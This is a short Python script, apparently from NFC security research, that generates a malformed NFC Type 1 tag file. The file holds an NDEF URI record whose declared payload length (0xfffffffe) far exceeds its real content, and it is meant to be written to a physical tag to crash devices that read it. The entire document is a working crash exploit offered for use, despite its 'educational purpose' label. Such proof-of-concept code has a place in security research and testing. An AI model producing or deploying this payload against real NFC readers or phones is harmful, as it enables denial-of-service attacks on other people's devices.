#!/usr/bin/python

#
# Copyright: Collin Mulliner <collin@mulliner.org>
# Web: http://www.mulliner.org/nfc/
#
# License: GPLv2
#

#
# For educational purpose only!
#

import NDEFMessage
import NFCTagType1
import os

if len(os.sys.argv) < 2:
	print "syntax: PayloadLenCrashTag <outputfile>"
	print " write file to RFID tag using: ndef_mifare -w <outputfile>"
else:
	m = NDEFMessage.NDEFRecord()
	m.setTnf(0x1)
	m.setType("U")
	m.setPayload("\0http://www.mulliner.org/nfc/")
	m.setSR(0)
	m.setPayloadLen(0xfffffffe)
	tag = NFCTagType1.NFCTagType1()
	tag.setNDEF(m.getHex())
	fp = open(os.sys.argv[1], 'wb')
	fp.write(tag.getTag(0))
	fp.close()
